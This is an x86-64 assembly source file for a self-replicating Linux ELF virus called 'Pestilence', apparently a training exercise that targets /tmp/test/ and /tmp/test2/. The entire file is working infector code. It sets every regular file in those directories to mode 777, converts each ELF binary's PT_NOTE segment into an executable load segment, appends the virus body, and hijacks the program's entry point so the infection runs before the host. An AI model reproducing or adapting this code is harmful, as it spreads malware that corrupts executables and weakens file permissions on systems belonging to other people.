%include "pestilence.inc"

bits 64
section .text
default rel
global _start

_start:

; ##### VIRUS SETUP AND EXIT #####

	; === Saving some registers ===
	push rdi
	push rsi
	push rcx
	push rdx

	; === Placing the 'famine' struct on the stack ===
	push rbp
	mov rbp, rsp
	sub rsp, famine_size

	; === Loading the address of the directory name string in rdi, and calling _traverse_dir ===
	lea rdi, [rel target_1]
	call _traverse_dir
	lea rdi, [rel target_2]
	call _traverse_dir

	; === Deleting the 'famine' struct from the stack
	add rsp, famine_size

	; === Placing original entry point in r15 ===
	lea r15, [rel _start]
	mov rsi, [rel virus_entry]
	sub r15, rsi
	add r15, [rel host_entry]

	; === Restoring registers and jumping to original entry point ===
	pop rbp
	pop rdx
	pop rcx
	pop rsi
	pop rdi
	jmp r15



; ##### LOOP THROUGH TARGET DIRECTORIES #####

_traverse_dir:
	; === Opening the target directory (path address in rdi) | open(dir, O_RDONLY | O_DIRECTORY, 0) ===
	mov r12, rdi												; Saving name of directory in r12
	mov rsi, O_RDONLY | O_DIRECTORY
	xor rdx, rdx
	mov rax, SYS_OPEN
	syscall
	mov dword FAM(famine.dir_fd), eax
	cmp rax, 0
	jl _return

	; === Calling getdents to get content of directory | getdents(dir_fd, struc linux_dirent *dirp, count) ===
	mov rdi, rax												; rax has the fd of the "open" call on directory
	lea rsi, FAM(famine.dirents)								; We will store the dirents structure in our 'famine' structure
	mov rdx, DIRENTS_BUFF_SIZE
	mov rax, SYS_GETENTS
	syscall
	cmp rax, 0
	jl .end_dir_loop
	mov r15, rax												; r15 will keep the total size of the dirents structure read by the syscall

	; === Initializing total_dreclen to 0 ===
	xor r8, r8
	mov FAM(famine.total_dreclen), r8

	; === Loop iterating through every entries of current directory ===
	.list_dir:
	xor r14, r14											; r14 will store d_reclen of current dirent
	lea rsi, FAM(famine.dirents)							; rsi will be used to navigate current dirent, and ultimatly store d_name
	add rsi, FAM(famine.total_dreclen)						; bring rsi to our current dirent (start of dirent array + total d_reclen browsed until now)
	mov r13, rsi											; r13 will store d_type of current dirent
	add rsi, D_RECLEN_OFF									; bring rsi to the offset at which d_reclen is located
	mov r14w, word [rsi]									; mov d_reclen (pointed by rsi) to r14
	add FAM(famine.total_dreclen), r14						; keep track of the total d_reclen
	add rsi, D_NAME_OFF - D_RECLEN_OFF						; bring rsi to the offset of d_name
	sub r14, 1
	add r13, r14											; we're adding d_reclen - 1 to r13 in order to bring it to the d_type offset
	movzx r13, byte [r13]									; r13 has d_type value

	cmp r13, 0x8											; If type is 0x8 (regular file), handle the file ; else, continue the loop
	je _file
	.check_dir_loop:
	cmp qword FAM(famine.total_dreclen), r15				; r15 has total size of the dirents structure (not used in file infection)
	jge .end_dir_loop										; If we already read this size, we finished iterating over entries of directory.
	jmp _traverse_dir.list_dir								; Else, we continue the loop

	; === Closing the directory when we're done ===
	.end_dir_loop:
	movzx rdi, word FAM(famine.dir_fd)
	mov rax, SYS_CLOSE
	syscall
	ret



; ##### FILE INFECTION #####

_file:
	mov qword FAM(famine.map_ptr), 0
	mov word FAM(famine.file_fd), 0
	; === Concatenating the directory name and the filename ===
	push rsi													; rsi has filename address. Save it on stack
	lea rdi, FAM(famine.current_fpath)							; We will store the complete path in our 'famine' structure
	mov rsi, r12												; r12 has directory name. 
	mov rdx, rdi												; Saving the complete file path address in rdx

	.dir:														; Copy the directory name to 'famine' structure
	movsb
	cmp byte [rsi], 0
	jne .dir
	pop rsi														; Put the filename in rsi
	.fname:														; Copy the filename to 'famine' structure and the terminating NULL BYTE
	movsb
	cmp byte [rsi - 1], 0
	jne .fname

	; === chmod 777 on the file to infect, to ensure we have read-write permissions on it ===
	; === TODO : restore the file permissions after infecting ? ===
	lea rdi, FAM(famine.current_fpath)
	mov rsi, 0q0777
	mov rax, SYS_CHMOD
	syscall

	; === Opening the file to infect | open(fpath, O_RDWR, 0)
	mov rdi, rdx												; rdx had the complete file path address
	mov rax, SYS_OPEN
	mov rsi, O_RDWR
	xor rdx, rdx
	syscall
	mov word FAM(famine.file_fd), ax
	mov r8, rax													; Storing the file fd in r8 (in preparation of mmap call)
	cmp rax, 0
	jl _traverse_dir.check_dir_loop

	; === Calculate the size of the file | lseek(file_fd, 0, SEEK_END) ===
	mov rdi, rax
	xor rsi, rsi
	mov rdx, SEEK_END
	mov rax, SYS_LSEEK
	syscall
	mov FAM(famine.fsize), rax									; Saving original file size in 'famine' structure
	mov FAM(famine.mmap_size), rax
	cmp rax, 4
	jl _end_file_infection

	; === First mmap to read the file (format? already infected ?) | mmap(0, filesize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0) ===
	xor rdi, rdi
	mov rsi, rax
	mov rdx, PROT_READ | PROT_WRITE
	mov r10, MAP_SHARED
	xor r9, r9
	mov rax, SYS_MMAP
	syscall
	mov FAM(famine.map_ptr), rax
	cmp rax, 0
	jl _end_file_infection

	; === Making sure the file is an ELF file ===
	cmp dword [rax], 0x464c457f
	jne _end_file_infection

	; === Making sure the ELF file is x64 ===
	cmp byte [rax + 0x4], 0x2
	jne _end_file_infection

	; === Making sure the ELF file is ET_EXEC or ET_DYN ===
	cmp word [rax + 0x10], 0x2
	je .is_infected
	cmp word [rax + 0x10], 0x3
	je .is_infected
	jmp _end_file_infection

	; === Is the file already infected ? ===
	.is_infected:
	mov rdi, FAM(famine.map_ptr)
	add rdi, FAM(famine.fsize)
	sub rdi, PAGE_SIZE - VIRUS_SIZE
	sub rdi, (_finish - signature)
	mov rsi, [rel signature]
	cmp rsi, qword [rdi]
	je _end_file_infection

	; === Truncate the file to add 4096 bytes | ftruncate(file_fd, fsize + 4096) ===
	movzx rdi, word FAM(famine.file_fd)
	mov rsi, FAM(famine.fsize)
	add rsi, PAGE_SIZE
	mov rax, SYS_FTRUNCATE
	syscall
	cmp rax, 0
	jl _end_file_infection

	; === remap original mapping to account for the extended file | mremap(map_ptr, filesize, filesize + 4096, 1, 0) ===
	mov rdi, FAM(famine.map_ptr)
	mov rsi, FAM(famine.fsize)
	mov rdx, rsi
	add rdx, PAGE_SIZE
	mov r10, 0x1												; MREMAP_MAYMOVE
	xor r8, r8
	mov rax, SYS_REMAP
	syscall
	mov FAM(famine.map_ptr), rax								; Updating the mapped file pointer in 'famine' structure
	add qword FAM(famine.mmap_size), PAGE_SIZE					; Update the size of the mapped file
	cmp rax, 0
	jl _end_file_infection


	; === Prepare to loop through segments (getting e_phoff and e_phnum) ===
	.segments:
	add rax, elf64_ehdr.e_phoff
	mov r11, [rax]												; Storing e_phoff in r11
	add rax, elf64_ehdr.e_phnum - elf64_ehdr.e_phoff
	movzx r14, word [rax]										; Storing e_phnum in r14
	dec r14
	mov rax, FAM(famine.map_ptr)
	add rax, r11												; rax is now at the start of segment headers in file
	xor r13, r13												; Counter to loop through segment headers

	; === Finding the first NOTE segment in file ===
	.phnum_loop:												; Iterating through segment headers
	call _check_note											; If we found the note segment, we go to .parse_note_segment
	cmp r13, r14												; Else, check if we still have segments to iterate upon
	jge _end_file_infection										; If not, we didn't find the note segment. Give up for this file
	add rax, elf64_phdr_size									; If yes, increase counter and go to next segment
	inc r13
	jmp _file.phnum_loop

	.parse_note_segment:										; rcx is at beginning of the note segment header
	; === Get the note segment header offset ===
	mov rdi, rcx
	sub rdi, FAM(famine.map_ptr)

	; === Patch note segment header ===
	mov rax, FAM(famine.map_ptr)
	add rax, rdi
	mov dword [rax], 0x1										; Convert note segment type to PT_LOAD

	add rax, elf64_phdr.p_flags
	mov dword [rax], 0x5										; Set segment permissions to R E

	add rax, elf64_phdr.p_offset - elf64_phdr.p_flags			; Set offset to the very end of the file
	mov rdi, FAM(famine.fsize)
	mov [rax], rdi
	
	add rax, elf64_phdr.p_vaddr - elf64_phdr.p_offset
	mov rdi, FAM(famine.fsize)
	add rdi, 0xc000000
	mov [rax], rdi

	add rax, elf64_phdr.p_paddr - elf64_phdr.p_vaddr
	mov [rax], rdi

	add rax, elf64_phdr.p_filesz - elf64_phdr.p_paddr
	mov qword [rax], PAGE_SIZE
	add rax, elf64_phdr.p_memsz - elf64_phdr.p_filesz
	mov qword [rax], PAGE_SIZE


	; === Patch ELF header ===
	mov rax, FAM(famine.map_ptr)
	add rax, elf64_ehdr.e_entry
	mov rsi, [rax]
	mov FAM(famine.orig_entry), rsi

	mov rdi, FAM(famine.fsize)
	add rdi, 0xc000000
	mov r13, rdi
	mov [rax], rdi

	; === Write virus at the very end of the file ===
	mov rdi, FAM(famine.map_ptr)
	add rdi, FAM(famine.fsize)
	lea rsi, [rel _start]
	mov rcx, VIRUS_SIZE
	repnz movsb

	; === Patch entries ===
	mov qword [rdi - 8], r13
	mov r14, FAM(famine.orig_entry)
	mov qword [rdi - 16], r14


	jmp _end_file_infection



_end_file_infection:
	.munmap:
	mov rdi, FAM(famine.map_ptr)
	cmp rdi, 0													; If we don't have any file mapping yet, just close the file
	je .close_file
	mov rsi, FAM(famine.mmap_size)
	mov rax, SYS_MUNMAP
	syscall
	.close_file:
	mov rdi, FAM(famine.file_fd)
	mov rax, SYS_CLOSE
	syscall
	jmp _traverse_dir.check_dir_loop

_check_note:
	mov rsi, rax												; rax has the address of p_type
	cmp dword [rsi], 0x4										; 0x4 is PT_NOTE
	jne _return													; If the segment type isn't PT_NOTE, we continue the search
	mov rcx, rax												; Else, we store its address in rcx
	pop rsi														; We're not returning but jumping, so pop the return address that was pushed on the stack
	jmp _file.parse_note_segment

_return:
	ret

_exit:
	mov rax, SYS_EXIT
	mov rdi, 0
	syscall

target_1	db		"/tmp/test/",0x0
target_2	db		"/tmp/test2/",0x0
signature	db		"Pestilence version 1.0 (c)oded by qroland",0x0
host_entry	dq		_exit
virus_entry	dq		_start
_finish:

; TODO :
; > Re-check the correct closing of fd and munmapping of maps
; > Use mremap instead of two different mmap



; 0x555561565c48
